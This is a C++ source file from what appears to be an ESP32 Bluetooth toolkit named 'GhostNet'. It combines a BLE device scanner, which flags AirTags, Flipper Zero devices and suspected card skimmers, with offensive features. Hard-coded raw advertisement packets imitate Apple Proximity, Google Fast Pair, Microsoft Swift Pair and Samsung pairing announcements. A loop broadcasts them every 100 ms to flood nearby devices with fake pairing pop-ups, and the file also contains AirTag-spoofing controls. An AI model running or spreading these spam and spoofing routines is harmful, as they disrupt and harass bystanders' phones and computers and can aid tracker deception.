/*
 * ============================================================
 *  GhostNet — ble_module.cpp
 *  BLE Scanning, Device Classification, BLE Spam, AirTag Spoofing
 * ============================================================
 */

#include "ble_module.h"
#include "utils.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEServer.h>
#include <esp_gap_ble_api.h>

class GhostBLEAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
  BleModule* _parent;
public:
  GhostBLEAdvertisedDeviceCallbacks(BleModule* parent) : _parent(parent) {}

  void onResult(BLEAdvertisedDevice advertisedDevice) {
    if (_parent->getDeviceCount() >= MAX_BLE_DEVICES) return;

    BLEDeviceInfo dev;
    memset(&dev, 0, sizeof(dev));

    String name = advertisedDevice.getName().c_str();
    if (name.length() > 0) {
      strncpy(dev.name, name.c_str(), 31);
    } else {
      strcpy(dev.name, "(Unknown)");
    }
    dev.name[31] = '\0';

    strncpy(dev.address, advertisedDevice.getAddress().toString().c_str(), 17);
    dev.address[17] = '\0';
    dev.rssi = advertisedDevice.getRSSI();
    strcpy(dev.deviceType, "BLE Device");
    dev.isAlert = false;

    // Classification
    if (advertisedDevice.haveManufacturerData()) {
      std::string mfg = advertisedDevice.getManufacturerData();
      if (mfg.length() >= 2) {
        uint16_t mfgId = (uint8_t)mfg[0] | ((uint8_t)mfg[1] << 8);
        if (mfgId == 0x004C) { // Apple Inc.
          if (mfg.length() >= 4 && (uint8_t)mfg[2] == 0x12) {
            strcpy(dev.deviceType, "AirTag");
            dev.isAlert = true;
          } else if (mfg.length() >= 4 && (uint8_t)mfg[2] == 0x02) {
            strcpy(dev.deviceType, "iBeacon");
          } else {
            strcpy(dev.deviceType, "Apple");
          }
        } else if (mfgId == 0x0075) { // Samsung
          strcpy(dev.deviceType, "Samsung");
        } else if (mfgId == 0x0006) { // Microsoft
          strcpy(dev.deviceType, "Microsoft");
        }
      }
    }

    // Flipper Zero / Skimmer signatures
    String addrStr = dev.address;
    addrStr.toUpperCase();
    if (name.indexOf("Flipper") >= 0 || name.indexOf("flipper") >= 0) {
      strcpy(dev.deviceType, "Flipper Zero");
      dev.isAlert = true;
    } else if (addrStr.startsWith("00:1B:DC") || addrStr.startsWith("20:13:08")) {
      strcpy(dev.deviceType, "Skimmer?");
      dev.isAlert = true;
    }

    // Duplicate check
    for (int i = 0; i < _parent->getDeviceCount(); i++) {
      if (strcmp(_parent->getDevice(i)->address, dev.address) == 0) {
        _parent->getDevice(i)->rssi = dev.rssi;
        return;
      }
    }

    int idx = _parent->getDeviceCount();
    if (idx < MAX_BLE_DEVICES) {
      memcpy(_parent->getDevice(idx), &dev, sizeof(BLEDeviceInfo));
      _parent->incrementDeviceCount();
    }
  }
};

BleModule::BleModule() {
  _deviceCount = 0;
  _scanning = false;
  _spamming = false;
  _spamMode = BLE_SPAM_APPLE;
  _spamCount = 0;
  _lastSpamMs = 0;
  _airtagSpoofing = false;
  _airtagSpoofCount = 0;
  _lastAirtagMs = 0;
}

void BleModule::init() {
  BLEDevice::init("GhostNet");
}

void BleModule::startScan() {
  _deviceCount = 0;
  _scanning = true;
  BLEScan* pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new GhostBLEAdvertisedDeviceCallbacks(this));
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  pBLEScan->start(BLE_SCAN_TIME, false);
  _scanning = false;
}

void BleModule::stopScan() {
  BLEDevice::getScan()->stop();
  _scanning = false;
}

bool BleModule::isScanning() const { return _scanning; }
int BleModule::getDeviceCount() const { return _deviceCount; }
BLEDeviceInfo* BleModule::getDevice(int index) {
  if (index >= 0 && index < MAX_BLE_DEVICES) return &_devices[index];
  return nullptr;
}
BLEDeviceInfo* BleModule::getDevices() { return _devices; }
void BleModule::clearDevices() { _deviceCount = 0; }
void BleModule::incrementDeviceCount() { if (_deviceCount < MAX_BLE_DEVICES) _deviceCount++; }

// ── BLE Spam Payloads ────────────────────────────────────────
void BleModule::startSpam(BLESpamMode mode) {
  _spamMode = mode;
  _spamming = true;
  _spamCount = 0;
  _lastSpamMs = millis();
}

void BleModule::stopSpam() {
  _spamming = false;
  BLEDevice::getAdvertising()->stop();
}

void BleModule::_sendAppleSpam() {
  // Apple AirDrop / Proximity Action packet
  uint8_t appleData[] = {
    0x1E, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x01,
    0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  };
  esp_ble_gap_config_adv_data_raw(appleData, sizeof(appleData));
  BLEDevice::startAdvertising();
}

void BleModule::_sendAndroidSpam() {
  // Fast Pair announcement
  uint8_t androidData[] = {
    0x02, 0x01, 0x06, 0x03, 0x03, 0x2C, 0xFE, 0x06,
    0x16, 0x2C, 0xFE, 0x00, 0xB4, 0xC4
  };
  esp_ble_gap_config_adv_data_raw(androidData, sizeof(androidData));
  BLEDevice::startAdvertising();
}

void BleModule::_sendWindowsSpam() {
  // Microsoft Swift Pair
  uint8_t winData[] = {
    0x02, 0x01, 0x06, 0x0A, 0xFF, 0x06, 0x00, 0x03,
    0x00, 0x80, 0x47, 0x68, 0x6F, 0x73, 0x74
  };
  esp_ble_gap_config_adv_data_raw(winData, sizeof(winData));
  BLEDevice::startAdvertising();
}

void BleModule::_sendSamsungSpam() {
  // Samsung Buds / Watch pairing popup
  uint8_t samsungData[] = {
    0x18, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,
    0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x6C, 0x6F,
    0x75, 0x64, 0x42, 0x75, 0x64, 0x73, 0x00, 0x00, 0x00
  };
  esp_ble_gap_config_adv_data_raw(samsungData, sizeof(samsungData));
  BLEDevice::startAdvertising();
}

void BleModule::sendSpamPacket() {
  if (!_spamming) return;
  if (millis() - _lastSpamMs < 100) return;
  _lastSpamMs = millis();

  switch (_spamMode) {
    case BLE_SPAM_APPLE:
      _sendAppleSpam();
      break;
    case BLE_SPAM_ANDROID:
      _sendAndroidSpam();
      break;
    case BLE_SPAM_WINDOWS:
      _sendWindowsSpam();
      break;
    case BLE_SPAM_SAMSUNG:
      _sendSamsungSpam();
      break;
    case BLE_SPAM_ALL:
      switch (_spamCount % 4) {
        case 0: _sendAppleSpam(); break;
        case 1: _sendAndroidSpam(); break;
        case 2: _sendWindowsSpam(); break;
        case 3: _sendSamsungSpam(); break;
      }
      break;
    default:
      break;
  }
  _spamCount++;
}

bool BleModule::isSpamming() const { return _spamming; }
uint32_t BleModule::getSpamCount() const { return _spamCount; }
BLESpamMode BleModule::getSpamMode() const { return _spamMode; }

void BleModule::startAirTagSpoof() {
  _airtagSpoofing = true;
  _airtagSpoofCount = 0;
  _lastAirtagMs = millis();
}

void BleModule::stopAirTagSpoof() {
  _airtagSpoofing = false;
  BLEDevice::getAdvertising()->stop();
}

bool BleModule::isAirTagSpoofing() const { return _airtagSpoofing; }
uint32_t BleModule::getAirTagSpoofCount() const { return _airtagSpoofCount; }
